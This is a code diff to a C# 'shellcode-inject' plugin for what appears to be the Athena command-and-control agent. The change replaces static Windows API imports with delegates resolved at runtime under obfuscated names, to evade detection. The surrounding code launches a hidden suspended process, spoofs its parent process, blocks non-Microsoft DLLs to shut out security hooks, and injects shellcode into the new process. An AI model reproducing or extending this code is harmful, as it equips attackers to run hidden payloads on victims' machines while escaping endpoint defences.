@@ -6,12 +6,24 @@ using System.Runtime.InteropServices;
 using shellcode_inject;
 using System.Diagnostics;
 using Athena.Commands;
-using static shellcode_inject.Native;
+//using static shellcode_inject.Native;
 
 namespace Plugins
 {
     public class ShellcodeInject : AthenaPlugin
     {
+        DynamicHandler.DynamicMakePipe dlgCretPipe = (DynamicHandler.DynamicMakePipe)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CrtPipe, typeof(DynamicHandler.DynamicMakePipe));
+        DynamicHandler.DynamicSetHndlInfo dlgSetHandle = (DynamicHandler.DynamicSetHndlInfo)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.SetHanldeInfo, typeof(DynamicHandler.DynamicSetHndlInfo));
+        DynamicHandler.DynamicInitProcThreaAttrList dlgInitProcThreadAttrLst = (DynamicHandler.DynamicInitProcThreaAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.IntlzProcThrdAttrList, typeof(DynamicHandler.DynamicInitProcThreaAttrList));
+        DynamicHandler.DynamicCreateProc dlgCretProc = (DynamicHandler.DynamicCreateProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.CreateProc, typeof(DynamicHandler.DynamicCreateProc));
+        DynamicHandler.DynamicWaitForSingleObject dlgWaitForObj = (DynamicHandler.DynamicWaitForSingleObject)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.WitFrObj, typeof(DynamicHandler.DynamicWaitForSingleObject));
+        DynamicHandler.DynamicOpenProc dlgOpenProc = (DynamicHandler.DynamicOpenProc)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.OpenProc, typeof(DynamicHandler.DynamicOpenProc));
+        DynamicHandler.DynamicClsHndl dlgClsHndl = (DynamicHandler.DynamicClsHndl)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.ClsHndl, typeof(DynamicHandler.DynamicClsHndl));
+        DynamicHandler.DynamicUpdteProcThredAttr dlgUpdProcThreadAttr = (DynamicHandler.DynamicUpdteProcThredAttr)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.UpdProcThrdAttr, typeof(DynamicHandler.DynamicUpdteProcThredAttr));
+        DynamicHandler.DynamicPeekPipe dlgPeekPipe = (DynamicHandler.DynamicPeekPipe)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.PeekPipe, typeof(DynamicHandler.DynamicPeekPipe));
+        DynamicHandler.DynamicDelProcThredAttrList dlgDelProcThrdAttrLst = (DynamicHandler.DynamicDelProcThredAttrList)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.DelProcThrAttrList, typeof(DynamicHandler.DynamicDelProcThredAttrList));
+        DynamicHandler.DynamicDupeHndl dlgDupeHandle = (DynamicHandler.DynamicDupeHndl)DynamicHandler.findDeleg("kernel32.dll", DynamicHandler.DupeHandle, typeof(DynamicHandler.DynamicDupeHndl));
+
         //Todo: https://github.com/Kara-4search/MappingInjection_CSharp/blob/main/MappingInjection/MappingEarlyBirdInjection.cs
         public override string Name => "shellcode-inject";
         private ITechnique technique = new MVS();
@@ -54,9 +66,9 @@ namespace Plugins
             //Credit for a lot of this code goes to #leoloobeek
             //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
             ManualResetEvent mre = new ManualResetEvent(false);
-            var saHandles = new Native.SECURITY_ATTRIBUTES()
+            var saHandles = new DynamicHandler.SECURITY_ATTRIBUTES()
             {
-                nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
+                nLength = Marshal.SizeOf(new DynamicHandler.SECURITY_ATTRIBUTES()),
                 bInheritHandle = true,
                 lpSecurityDescriptor = IntPtr.Zero
 
@@ -69,11 +81,11 @@ namespace Plugins
             IntPtr hDupStdOutWrite = IntPtr.Zero;
 
             // Create the pipe and make sure read is not inheritable
-            Native.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
-            Native.SetHandleInformation(hStdOutRead, Native.HANDLE_FLAGS.INHERIT, 0);
+            DynamicHandler.CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
+            dlgSetHandle(hStdOutRead, DynamicHandler.HANDLE_FLAGS.INHERIT, 0);
 
-            var pInfo = new Native.PROCESS_INFORMATION();
-            var siEx = new Native.STARTUPINFOEX();
+            var pInfo = new DynamicHandler.PROCESS_INFORMATION();
+            var siEx = new DynamicHandler.STARTUPINFOEX();
 
             // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
             siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
@@ -84,7 +96,7 @@ namespace Plugins
             siEx.StartupInfo.hStdOutput = hStdOutWrite;
 
             var lpSize = IntPtr.Zero;
-            var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+            var success = DynamicHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
 
             if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
             {
@@ -92,7 +104,7 @@ namespace Plugins
             }
 
             siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
+            success = DynamicHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
 
             if (!success)
             {
@@ -111,15 +123,15 @@ namespace Plugins
 
             }
 
-            siEx.StartupInfo.dwFlags = Native.STARTF_USESHOWWINDOW | Native.STARTF_USESTDHANDLES;
-            siEx.StartupInfo.wShowWindow = Native.SW_HIDE;
+            siEx.StartupInfo.dwFlags = DynamicHandler.STARTF_USESHOWWINDOW | DynamicHandler.STARTF_USESTDHANDLES;
+            siEx.StartupInfo.wShowWindow = DynamicHandler.SW_HIDE;
 
-            var ps = new Native.SECURITY_ATTRIBUTES();
-            var ts = new Native.SECURITY_ATTRIBUTES();
+            var ps = new DynamicHandler.SECURITY_ATTRIBUTES();
+            var ts = new DynamicHandler.SECURITY_ATTRIBUTES();
             ps.nLength = Marshal.SizeOf(ps);
             ts.nLength = Marshal.SizeOf(ts);
 
-            bool ret = Native.CreateProcess(null, processName, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
+            bool ret = dlgCretProc(null, processName, ref ps, ref ts, true, DynamicHandler.EXTENDED_STARTUPINFO_PRESENT | DynamicHandler.CREATE_NO_WINDOW | DynamicHandler.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
             if (!ret)
             {
                 TaskResponseHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
@@ -140,9 +152,9 @@ namespace Plugins
             //Credit for a lot of this code goes to #leoloobeek
             //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
             ManualResetEvent mre = new ManualResetEvent(false);
-            var saHandles = new Native.SECURITY_ATTRIBUTES()
+            var saHandles = new DynamicHandler.SECURITY_ATTRIBUTES()
             {
-                nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
+                nLength = Marshal.SizeOf(new DynamicHandler.SECURITY_ATTRIBUTES()),
                 bInheritHandle = true,
                 lpSecurityDescriptor = IntPtr.Zero
 
@@ -151,15 +163,15 @@ namespace Plugins
             // Duplicate handle created just in case
             IntPtr hDupStdOutWrite = IntPtr.Zero;
 
-            var pInfo = new Native.PROCESS_INFORMATION();
-            var siEx = new Native.STARTUPINFOEX();
+            var pInfo = new DynamicHandler.PROCESS_INFORMATION();
+            var siEx = new DynamicHandler.STARTUPINFOEX();
 
             // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
             siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
             IntPtr lpValueProc = IntPtr.Zero;
 
             var lpSize = IntPtr.Zero;
-            var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+            var success = DynamicHandler.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
             
             if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
             {
@@ -167,7 +179,7 @@ namespace Plugins
             }
 
             siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-            success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
+            success = DynamicHandler.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
 
             if (!success)
             {
@@ -188,15 +200,15 @@ namespace Plugins
 
             }
 
-            siEx.StartupInfo.dwFlags = Native.STARTF_USESHOWWINDOW | Native.STARTF_USESTDHANDLES;
-            siEx.StartupInfo.wShowWindow = Native.SW_HIDE;
+            siEx.StartupInfo.dwFlags = DynamicHandler.STARTF_USESHOWWINDOW | DynamicHandler.STARTF_USESTDHANDLES;
+            siEx.StartupInfo.wShowWindow = DynamicHandler.SW_HIDE;
 
-            var ps = new Native.SECURITY_ATTRIBUTES();
-            var ts = new Native.SECURITY_ATTRIBUTES();
+            var ps = new DynamicHandler.SECURITY_ATTRIBUTES();
+            var ts = new DynamicHandler.SECURITY_ATTRIBUTES();
             ps.nLength = Marshal.SizeOf(ps);
             ts.nLength = Marshal.SizeOf(ts);
 
-            bool ret = Native.CreateProcess(null, processName, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
+            bool ret = dlgCretProc(null, processName, ref ps, ref ts, true, DynamicHandler.EXTENDED_STARTUPINFO_PRESENT | DynamicHandler.CREATE_NO_WINDOW | DynamicHandler.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
             if (!ret)
             {
                 TaskResponseHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
@@ -207,24 +219,24 @@ namespace Plugins
 
             method.Inject(sc, pInfo.hProcess);
             
-            Native.WaitForSingleObject(pInfo.hProcess, INFINITE);
+            dlgWaitForObj(pInfo.hProcess, DynamicHandler.INFINITE);
             
             CleanUp(lpValueProc, tempHandle, pInfo, siEx);
 
             return pInfo.hProcess != IntPtr.Zero;
         }
-        private bool AddBlockDLLs(ref Native.STARTUPINFOEX siEx, ref IntPtr lpSize)
+        private bool AddBlockDLLs(ref DynamicHandler.STARTUPINFOEX siEx, ref IntPtr lpSize)
         {
             //Initializes the specified list of attributes for process and thread creation.
 
             IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
-            Marshal.WriteInt64(lpMitigationPolicy, Native.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
+            Marshal.WriteInt64(lpMitigationPolicy, DynamicHandler.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
 
             // Add Microsoft-only DLL protection to our StartupInfoEx struct
-            var success = Native.UpdateProcThreadAttribute(
+            var success = dlgUpdProcThreadAttr(
                 siEx.lpAttributeList,
                 0,
-                (IntPtr)Native.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                (IntPtr)DynamicHandler.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                 lpMitigationPolicy,
                 (IntPtr)IntPtr.Size,
                 IntPtr.Zero,
@@ -236,10 +248,10 @@ namespace Plugins
             }
             return true;
         }
-        private bool AddSpoofParent(int parentProcessId, ref Native.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
+        private bool AddSpoofParent(int parentProcessId, ref DynamicHandler.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
         {
             //Get a handle to the parent process
-            IntPtr parentHandle = Native.OpenProcess(Native.ProcessAccessFlags.CreateProcess | Native.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
+            IntPtr parentHandle = dlgOpenProc(DynamicHandler.ProcessAccessFlags.CreateProcess | DynamicHandler.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
 
             // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
             lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
@@ -247,10 +259,10 @@ namespace Plugins
             Marshal.WriteIntPtr(lpValueProc, parentHandle);
 
             //Updates the parent process ID
-            bool success = Native.UpdateProcThreadAttribute(
+            bool success = DynamicHandler.UpdateProcThreadAttribute(
                 siEx.lpAttributeList,
                 0,
-                (IntPtr)Native.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                (IntPtr)DynamicHandler.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                 lpValueProc,
                 (IntPtr)IntPtr.Size,
                 IntPtr.Zero,
@@ -262,9 +274,9 @@ namespace Plugins
             }
 
             IntPtr hCurrent = Process.GetCurrentProcess().Handle;
-            IntPtr hNewParent = Native.OpenProcess(Native.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
+            IntPtr hNewParent = dlgOpenProc(DynamicHandler.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
 
-            success = Native.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, Native.DUPLICATE_CLOSE_SOURCE | Native.DUPLICATE_SAME_ACCESS);
+            success = dlgDupeHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DynamicHandler.DUPLICATE_CLOSE_SOURCE | DynamicHandler.DUPLICATE_SAME_ACCESS);
 
             if (!success)
             {
@@ -277,7 +289,7 @@ namespace Plugins
 
             return true;
         }
-        private bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx, string task_id)
+        private bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, DynamicHandler.PROCESS_INFORMATION pInfo, DynamicHandler.STARTUPINFOEX siEx, string task_id)
         {
             CancellationTokenSource cts = new CancellationTokenSource();
             CancellationToken ct = cts.Token;
@@ -286,7 +298,7 @@ namespace Plugins
 
             while (!ct.IsCancellationRequested) //Loop to handle process output
             {
-                if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) //If the process closed, tell the loop to stop
+                if (dlgWaitForObj(pInfo.hProcess, 100) == 0) //If the process closed, tell the loop to stop
                 {
                     cts.Cancel();
                 }
@@ -295,8 +307,9 @@ namespace Plugins
                 int bytesRead;
                 uint bytesToRead = 0;
 
-                if(Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) //Check if we have bytes to read
+                if(dlgPeekPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) //Check if we have bytes to read
                 {
+                    Console.WriteLine(bytesToRead);
                     if(bytesToRead == 0) //We don't have any bytes to read
                     {
                         if (ct.IsCancellationRequested) //Check if we're supposed to exit
@@ -343,16 +356,16 @@ namespace Plugins
 
             if (hStdOutRead != IntPtr.Zero) //Close our allocated stdout handle if it exists
             {
-                Native.CloseHandle(hStdOutRead);
+                dlgClsHndl(hStdOutRead);
             }
 
             return true;
         }
-        private void CleanUp(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx)
+        private void CleanUp(IntPtr lpValueProc, IntPtr hStdOutRead, DynamicHandler.PROCESS_INFORMATION pInfo, DynamicHandler.STARTUPINFOEX siEx)
         {
             if (siEx.lpAttributeList != IntPtr.Zero) //Close our allocated attributes list
             {
-                Native.DeleteProcThreadAttributeList(siEx.lpAttributeList);
+                dlgDelProcThrdAttrLst(siEx.lpAttributeList);
                 Marshal.FreeHGlobal(siEx.lpAttributeList);
             }
 
@@ -360,13 +373,13 @@ namespace Plugins
 
             if (pInfo.hProcess != IntPtr.Zero) //Close process and thread handles
             {
-                //Native.TerminateProcess(pInfo.hProcess, 0);
-                Native.CloseHandle(pInfo.hProcess);
+                //DynamicHandler.TerminateProcess(pInfo.hProcess, 0);
+                dlgClsHndl(pInfo.hProcess);
             }
 
             if (pInfo.hThread != IntPtr.Zero)
             {
-                Native.CloseHandle(pInfo.hThread);
+                dlgClsHndl(pInfo.hThread);
             }
         }
     }
